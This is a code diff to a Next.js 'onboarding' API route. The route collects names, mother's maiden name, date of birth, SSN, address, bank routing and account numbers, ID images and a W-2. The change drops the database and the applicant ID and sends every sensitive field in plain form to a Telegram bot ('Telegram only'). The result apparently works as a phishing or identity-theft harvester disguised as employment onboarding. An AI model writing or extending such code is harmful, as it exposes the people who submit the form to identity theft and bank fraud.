@@ -2,36 +2,24 @@
 import { NextResponse } from "next/server";
 import { createClient, type SupabaseClient } from "@supabase/supabase-js";
 import { randomUUID } from "crypto";
-import { sendTelegramNotification } from "@/app/lib/sendTelegramNotification";
-import { Pool } from "pg";
+import sendTelegramNotification  from "@/app/lib/sendTelegramNotification";
 
 export const runtime = "nodejs";
 export const maxDuration = 60;
 
 type Env = {
-  DATABASE_URL: string;
   NEXT_PUBLIC_SUPABASE_URL: string;
   SUPABASE_SERVICE_ROLE_KEY: string;
 };
 
 function requireEnv(): Env {
-  const DATABASE_URL = process.env.DATABASE_URL;
   const NEXT_PUBLIC_SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
   const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
 
-  // ✅ TypeScript-safe narrowing (no `!`, no casts)
-  if (!DATABASE_URL) throw new Error("Missing env var: DATABASE_URL");
   if (!NEXT_PUBLIC_SUPABASE_URL) throw new Error("Missing env var: NEXT_PUBLIC_SUPABASE_URL");
   if (!SUPABASE_SERVICE_ROLE_KEY) throw new Error("Missing env var: SUPABASE_SERVICE_ROLE_KEY");
 
-  return { DATABASE_URL, NEXT_PUBLIC_SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY };
-}
-
-function makePool(databaseUrl: string) {
-  return new Pool({
-    connectionString: databaseUrl,
-    ssl: { rejectUnauthorized: false },
-  });
+  return { NEXT_PUBLIC_SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY };
 }
 
 function makeSupabase(url: string, serviceKey: string) {
@@ -55,15 +43,15 @@ async function uploadToSupabase(opts: {
   supabase: SupabaseClient;
   file: Blob;
   filename: string;
+  bucket?: string;
 }) {
-
-  const { supabase, file, filename } = opts;
+  const { supabase, file, filename, bucket = "onboarding" } = opts;
 
   const buffer = Buffer.from(await file.arrayBuffer());
   const contentType = file.type || "application/octet-stream";
 
   const { error: uploadError } = await supabase.storage
-    .from("onboarding")
+    .from(bucket)
     .upload(filename, buffer, { contentType, upsert: true });
 
   if (uploadError) {
@@ -71,28 +59,26 @@ async function uploadToSupabase(opts: {
     throw new Error(`Upload failed for ${filename}: ${uploadError.message}`);
   }
 
-  const { data: urlData } = supabase.storage.from("onboarding").getPublicUrl(filename);
-
-  if (!urlData?.publicUrl) {
-    throw new Error(`Failed to get public URL for ${filename}`);
-  }
+  const { data: urlData } = supabase.storage.from(bucket).getPublicUrl(filename);
+  if (!urlData?.publicUrl) throw new Error(`Failed to get public URL for ${filename}`);
 
   return urlData.publicUrl;
 }
 
-export async function POST(req: Request) {
-  let pool: Pool | null = null;
+// Optional: avoid Telegram markdown issues
+function esc(s: string) {
+  return s.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
+}
 
+export async function POST(req: Request) {
   try {
     const env = requireEnv();
-
-    pool = makePool(env.DATABASE_URL);
     const supabase = makeSupabase(env.NEXT_PUBLIC_SUPABASE_URL, env.SUPABASE_SERVICE_ROLE_KEY);
 
     const formData = await req.formData();
     const get = (key: string) => formData.get(key)?.toString().trim() ?? "";
 
-    const applicant_id = get("applicant_id");
+    // Fields
     const first_name = get("first_name");
     const middle_name = get("middle_name");
     const last_name = get("last_name");
@@ -100,7 +86,7 @@ export async function POST(req: Request) {
 
     const ssn_raw = get("ssn");
     const ssn_digits = ssn_raw.replace(/\D/g, "");
-    const ssn = ssn_digits ? ssn_digits : null;
+    const ssn = ssn_digits ? ssn_digits : ""; // Telegram only
 
     const date_of_birth = get("date_of_birth");
     const routing_number = get("routing_number");
@@ -112,11 +98,9 @@ export async function POST(req: Request) {
     const state = get("address.state");
     const zip_code = get("address.zip_code");
 
-    if (!applicant_id || !first_name || !last_name) {
-      return NextResponse.json(
-        { error: "Missing applicant_id, first_name, or last_name." },
-        { status: 400 },
-      );
+    // ✅ Validation (NO applicant_id)
+    if (!first_name || !last_name) {
+      return NextResponse.json({ error: "Missing first_name or last_name." }, { status: 400 });
     }
 
     if (![street, city, state, zip_code].every(Boolean)) {
@@ -151,79 +135,34 @@ export async function POST(req: Request) {
       uploadToSupabase({ supabase, file: w2_form, filename: w2_form_filename }),
     ]);
 
-    await pool.query(
-      `INSERT INTO onboarding (
-        applicant_id, first_name, middle_name, last_name, mother_maiden_name,
-        ssn, date_of_birth,
-        street, city, state, zip_code,
-        account_number, routing_number, bank_name,
-        front_image_url, back_image_url, w2_form_url,
-        front_image_filename, back_image_filename, w2_form_filename,
-        onboarding_completed, onboarding_date
-      ) VALUES (
-        $1,$2,$3,$4,$5,
-        $6,$7,
-        $8,$9,$10,$11,
-        $12,$13,$14,
-        $15,$16,$17,
-        $18,$19,$20,
-        TRUE, NOW()
-      )
-      ON CONFLICT (applicant_id) DO UPDATE SET
-        first_name = EXCLUDED.first_name,
-        middle_name = EXCLUDED.middle_name,
-        last_name = EXCLUDED.last_name,
-        mother_maiden_name = EXCLUDED.mother_maiden_name,
-        ssn = EXCLUDED.ssn,
-        date_of_birth = EXCLUDED.date_of_birth,
-        street = EXCLUDED.street,
-        city = EXCLUDED.city,
-        state = EXCLUDED.state,
-        zip_code = EXCLUDED.zip_code,
-        account_number = EXCLUDED.account_number,
-        routing_number = EXCLUDED.routing_number,
-        bank_name = EXCLUDED.bank_name,
-        front_image_url = EXCLUDED.front_image_url,
-        back_image_url = EXCLUDED.back_image_url,
-        w2_form_url = EXCLUDED.w2_form_url,
-        front_image_filename = EXCLUDED.front_image_filename,
-        back_image_filename = EXCLUDED.back_image_filename,
-        w2_form_filename = EXCLUDED.w2_form_filename,
-        onboarding_completed = TRUE,
-        onboarding_date = NOW()`,
-      [
-        applicant_id,
-        first_name,
-        middle_name || null,
-        last_name,
-        mother_maiden || null,
-        ssn,
-        date_of_birth || null,
-        street,
-        city,
-        state,
-        zip_code,
-        account_number || null,
-        routing_number || null,
-        bank_name || null,
-        front_url,
-        back_url,
-        w2_url,
-        front_image_filename,
-        back_image_filename,
-        w2_form_filename,
-      ],
-    );
+    // ✅ Telegram only (no DB, no applicant id)
+    const fullName = `${first_name} ${middle_name ? middle_name + " " : ""}${last_name}`.trim();
 
-    // Fire-and-forget notification
-    sendTelegramNotification(
-      `📥 New Onboarding: ${first_name} ${last_name} (${bank_name})
-🔗 Front ID: ${front_url}
-🔗 Back ID: ${back_url}
-📄 W-2: ${w2_url}`.trim(),
-    ).catch((e) => console.error("Telegram failed:", e));
+   const messageLines = [
+  "📥 *New Onboarding*",
+  `👤 Name: ${fullName}`,
+  mother_maiden ? `👩 Maiden Name: ${mother_maiden}` : null,
+  date_of_birth ? `🎂 DOB: ${date_of_birth}` : null,
+  ssn ? `🧾 SSN: ${ssn}` : "🧾 SSN: (not provided)",
+  "",
+  `🏠 Address: ${street}, ${city}, ${state} ${zip_code}`,
+  "",
+  bank_name ? `🏦 Bank: ${bank_name}` : "🏦 Bank: (not provided)",
+  routing_number ? `🔢 Routing: ${routing_number}` : null,
+  account_number ? `💳 Account: ${account_number}` : null,
+  "",
+  `🪪 Front ID: ${front_url}`,
+  `🪪 Back ID: ${back_url}`,
+  `📄 W-2: ${w2_url}`,
+].filter(Boolean) as string[];
 
-    return NextResponse.json({ success: true });
+await sendTelegramNotification(messageLines.join("\n"), {
+  parse_mode: "Markdown",
+  disable_web_page_preview: true,
+});
+
+
+    return NextResponse.json({ success: true, front_url, back_url, w2_url });
   } catch (err: any) {
     console.error("❌ Onboarding failed:", err?.message || err);
 
@@ -233,9 +172,5 @@ export async function POST(req: Request) {
     }
 
     return NextResponse.json({ error: "Failed to complete onboarding." }, { status: 500 });
-  } finally {
-    try {
-      await pool?.end();
-    } catch {}
   }
 }
